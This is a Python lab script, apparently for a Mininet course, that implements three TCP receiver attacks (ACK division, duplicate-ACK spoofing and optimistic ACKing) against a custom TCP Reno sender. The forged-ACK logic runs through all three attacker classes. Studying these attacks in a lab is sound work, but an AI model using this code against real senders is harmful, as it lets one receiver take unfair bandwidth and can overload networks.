from reno import *
import time

class ACK_Division_Attacker(TCP_Client):
    def __init__(self, num, host, **kwargs):
        TCP_Client.__init__(self, 'receiver', host, **kwargs)
        self.num_division = num
        self.log_attacker = True
    
    def post_receive(self, pkt, status):
        if pkt[scp.TCP].seq == 1:
            new_seq = pkt[scp.TCP].seq
            payload_len = len(pkt[scp.TCP].payload)
            print(payload_len)
            print(payload_len / self.num_division)
            for i in xrange(self.num_division):
                ack_no = new_seq + (i+1) * (payload_len / self.num_division)
                self.send_ack(ack_no)
        else:
            TCP_Client.post_receive(self, pkt, status)

class DupACK_Spoofing_Attacker(TCP_Client):
    def __init__(self, num, host, **kwargs):
        TCP_Client.__init__(self, 'receiver', host, **kwargs)
        self.num_dupacks = num
        self.log_attacker = True

    def post_receive(self, pkt, status):
        if pkt[scp.TCP].seq == 1:
            for _ in xrange(self.num_dupacks):
                self.send_ack(self.ack)
        else:
            TCP_Client.post_receive(self, pkt, status)

class Optimistic_ACKing_Attacker(TCP_Client):
    def __init__(self, num, interval, host, **kwargs):
        TCP_Client.__init__(self, 'receiver', host, **kwargs)
        self.num_optacks = num
        self.ack_interval = interval
        self.log_attacker = True
    
    def post_receive(self, pkt, status):
        cur_ack_no = 1
        if pkt[scp.TCP].seq == 1:
            for _ in xrange(self.num_optacks):
                cur_ack_no += MSS
                self.send_ack(cur_ack_no)
                time.sleep(self.ack_interval / 1000.)
        else:
            TCP_Client.post_receive(self, pkt, status)


def check_attack_type(val):
    if val not in ['div', 'dup', 'opt']:
        raise argparse.ArgumentTypeError("%s is an invalid attack name." % val)
    return val

def parse_args():
    parser = argparse.ArgumentParser(description= \
            "TCP malicious receiver (attack implementations).")
    parser.add_argument('--host', dest='host', 
                        required=True, help="Mininet host (`h1` or `h2`)")    
    parser.add_argument('--attack', dest='attack', required=True,
        type=check_attack_type,
        help="The receiver attack to implement (`div`, `dup`, or `opt`).")

    parser.add_argument('--num', dest='num', required=True, type=int,
        help="The number of spoofed ACKs the attacker sends on receiving the \
                first data segment")
    parser.add_argument('--interval', dest='interval', type=int,
        help="Time interval between sending optimistic ACKs (in milliseconds).")

    parser.add_argument("--verbose", dest='verbose', action='store_true',
        help="Verbose flag for TCP communication log.")

    args = parser.parse_args()
    if args.attack == 'opt' and args.interval is None:
        parser.error('Optimistic ACKing attack requires --interval.')

    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()

    kwargs = {'verbose': args.verbose}
    if args.attack == 'div':
        attacker = ACK_Division_Attacker(args.num, args.host, **kwargs)
    if args.attack == 'dup':
        attacker = DupACK_Spoofing_Attacker(args.num, args.host, **kwargs)
    if args.attack == 'opt':
        attacker = Optimistic_ACKing_Attacker(args.num, args.interval, args.host, **kwargs) 
    
    attacker.start()
